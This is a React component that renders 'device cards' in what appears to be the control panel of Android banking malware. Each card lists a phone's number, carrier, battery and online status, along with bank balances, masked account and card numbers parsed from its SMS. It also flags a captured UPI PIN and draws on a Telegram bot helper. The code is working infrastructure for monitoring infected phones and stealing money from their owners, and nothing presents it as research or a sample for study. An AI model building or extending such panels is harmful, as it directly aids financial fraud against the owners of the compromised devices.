import { Wifi, IndianRupee, CreditCard, Zap, EllipsisVertical, TrendingUp, TrendingDown, StickyNote } from '../icons'
import BatteryIndicator from './BatteryIndicator'
import { formatIndianNumber, relativeTime } from '../utils/smsParser'
import { loadDeviceMeta } from '../utils/telegramBot'

export default function DeviceCard({ dev, onClick }) {
  const online = dev.status
  const analysis = dev.smsAnalysis
  const hasBank = analysis && analysis.bankBalances.length > 0
  const hasCard = analysis && analysis.cards.length > 0
  const topBalance = hasBank ? analysis.bankBalances[0] : null
  const phone = dev.phoneNumber && dev.phoneNumber !== '—' ? dev.phoneNumber : analysis?.phoneNumbers[0] || '—'
  const provider = dev.provider && dev.provider !== '—' ? dev.provider : analysis?.networks[0] || null
  const meta = loadDeviceMeta(dev.id)
  const hasNote = meta?.note && meta.note.trim().length > 0
  const unseen = !meta?.seenAt

  return (
    <div onClick={onClick} className={`group relative bg-[#111111] border rounded-2xl p-4 cursor-pointer transition-all duration-200 hover:border-[#2a2a2a] hover:bg-[#161616] hover:shadow-xl hover:shadow-black/40 hover:-translate-y-0.5 active:translate-y-0 ${
      dev.pinned ? 'border-amber-500/40 bg-[#141108]' : unseen ? 'border-cyan-500/40 bg-[#0a0f14] shadow-[0_0_12px_rgba(6,182,212,0.08)]' : 'border-[#1f1f1f]'
    }`}>
      <div className="flex items-start gap-3 mb-3">
        <div className={`w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 relative ${online ? 'bg-emerald-500/15 border border-emerald-500/25' : 'bg-[#1a1a1a] border border-[#262626]'}`}>
          {unseen && <span className="absolute -top-1 -right-1 w-3 h-3 bg-cyan-400 rounded-full border-2 border-[#111111]" style={{ boxShadow: '0 0 6px #22d3ee' }} />}
          <Wifi className={`w-5 h-5 ${online ? 'text-emerald-400' : 'text-[#444]'}`} />
        </div>
        <div className="flex-1 min-w-0">
          <h3 className="text-sm font-bold text-white truncate leading-tight">{dev.name}</h3>
          <p className="text-[10px] font-mono text-[#555] mt-0.5 truncate">{dev.id}</p>
        </div>
        <div className="flex items-center gap-1 flex-shrink-0">
          {hasNote && <StickyNote className="w-3.5 h-3.5 text-amber-400" />}
          {dev.upipin && <Zap className="w-3.5 h-3.5 text-amber-400" />}
          {hasBank && <IndianRupee className="w-3.5 h-3.5 text-emerald-400" />}
          {hasCard && <CreditCard className="w-3.5 h-3.5 text-purple-400" />}
          <button onClick={e => { e.stopPropagation(); onClick() }} className="p-1 rounded-lg text-[#444] hover:text-[#888] hover:bg-white/5 transition-colors">
            <EllipsisVertical className="w-3.5 h-3.5" />
          </button>
        </div>
      </div>
      <div className="grid grid-cols-2 gap-3 mb-3">
        <div>
          <p className="text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1">Android</p>
          <p className="text-sm font-bold text-[#ccc]">{dev.android !== '—' ? `v${dev.android.replace('v', '')}` : '—'}</p>
        </div>
        <div>
          <p className="text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1">Battery</p>
          <BatteryIndicator percent={dev.batteryPercent} />
        </div>
      </div>
      <div className="grid grid-cols-2 gap-3 mb-3">
        <div>
          <p className="text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1">Number</p>
          <p className="text-xs font-mono text-[#aaa] truncate">{phone}</p>
        </div>
        {provider && (
          <div>
            <p className="text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1">Network</p>
            <p className="text-xs font-semibold text-[#aaa] truncate">{provider}</p>
          </div>
        )}
      </div>
      {topBalance && (
        <div className="mb-3 px-3 py-2 rounded-xl bg-emerald-950/20 border border-emerald-900/20">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-1.5">
              <IndianRupee className="w-3.5 h-3.5 text-emerald-400" />
              <span className="text-[10px] font-semibold text-emerald-400">{topBalance.bankName}</span>
              {topBalance.accountLast4 && <span className="text-[9px] font-mono text-[#444]">{'••'}{topBalance.accountLast4}</span>}
            </div>
            <span className="text-sm font-black text-white">₹{formatIndianNumber(topBalance.availableBalance)}</span>
          </div>
          {topBalance.transactionType && (
            <div className="flex items-center gap-1 mt-1">
              {topBalance.transactionType === 'credit' ? <TrendingUp className="w-3 h-3 text-emerald-500" /> : <TrendingDown className="w-3 h-3 text-red-500" />}
              <span className={`text-[9px] font-semibold ${topBalance.transactionType === 'credit' ? 'text-emerald-500' : 'text-red-500'}`}>
                {topBalance.transactionType === 'credit' ? '+' : '-'}₹{formatIndianNumber(topBalance.transactionAmount || '0')} {topBalance.transactionType}
              </span>
            </div>
          )}
        </div>
      )}
      {hasCard && (
        <div className="mb-3 px-3 py-1.5 rounded-xl bg-purple-950/20 border border-purple-900/20 flex items-center gap-2">
          <CreditCard className="w-3.5 h-3.5 text-purple-400" />
          <span className="text-[10px] font-semibold text-purple-400">Card ••{analysis.cards[0].cardLast4}</span>
          {analysis.cards[0].cardType && <span className="text-[10px] text-[#555]">{analysis.cards[0].cardType}</span>}
          <span className="ml-auto text-[9px] text-purple-600">Available</span>
        </div>
      )}
      <div className="flex items-center gap-2 flex-wrap">
        <span className={`w-2 h-2 rounded-full flex-shrink-0 ${online ? 'bg-emerald-500' : 'bg-[#333]'}`} style={online ? { boxShadow: '0 0 6px #22c55e' } : {}} />
        {online ? (
          <span className="text-xs font-semibold text-emerald-400">Online</span>
        ) : (
          <div className="flex items-center gap-1.5 min-w-0">
            <span className="text-xs text-[#555]">Offline</span>
            {dev.lastSeen && <span className="text-[10px] font-mono text-[#444] bg-[#111] px-1.5 py-0.5 rounded border border-[#1e1e1e]">{relativeTime(dev.lastSeen)}</span>}
          </div>
        )}
        {dev.upipin && <span className="ml-auto px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400">UPI PIN</span>}
      </div>
    </div>
  )
}
